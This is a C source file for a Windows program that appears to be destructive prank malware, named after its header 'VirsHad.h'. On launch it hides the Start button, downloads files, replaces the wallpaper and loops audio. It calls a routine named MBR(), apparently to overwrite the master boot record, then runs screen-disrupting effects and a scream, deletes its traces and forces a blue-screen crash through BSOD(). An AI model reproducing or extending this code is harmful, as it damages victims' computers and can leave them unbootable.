#pragma comment(lib, "winmm.lib")
#include "VirsHad.h"
#include <Windows.h>
#include <stdio.h>

int MBR();
int BSOD();
int TextO();
int Icons();
int Scuaer();
int Melt();
int Invers();
int Download();
int XOR();

int c = 0;

int loop(){
    if (c < 100) {
        Scuaer();
        Invers();
        c++;
        loop();
    } else if (c < 2100) {
        Icons();
        c++;
        loop();
    } else if (c < 2200) {
        Melt();
        Invers();
        c++;
        loop();
    } else if (c < 2500) {
        TextO();
        TextO();
        TextO();
        TextO();
        TextO();
        XOR();
        c++;
        loop();
    } else {
        char* str = "C:\\Users\\Public\\Downloads\\screamBG.bmp";
        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        PlaySound(L"C:\\Users\\Public\\Downloads\\scream.wav", NULL, SND_FILENAME);
        remove("C:\\Users\\Public\\Downloads\\screamBG.bmp");
        remove("C:\\Users\\Public\\Downloads\\scream.wav");
        char* wp = "C:\\Users\\Public\\Downloads\\WP.bmp";
        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, wp, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        remove("C:\\Users\\Public\\Downloads\\WP.bmp");
        remove("C:\\Users\\Public\\Downloads\\BG.wav");
        remove("C:\\Users\\Public\\Downloads\\icon.bmp");
        BSOD();
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR, int) {
    HWND hTaskBar = FindWindow(L"Shell_TrayWnd", NULL);
    HWND hStartButton = GetWindow(hTaskBar, GW_CHILD);
    ShowWindow(hStartButton, SW_HIDE);
    Download();
    char* str = "C:\\Users\\Public\\Downloads\\WP.bmp";
    PlaySound(L"C:\\Users\\Public\\Downloads\\BG.wav", NULL, SND_LOOP | SND_ASYNC);
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    MBR();
    loop();

    return 0;
}
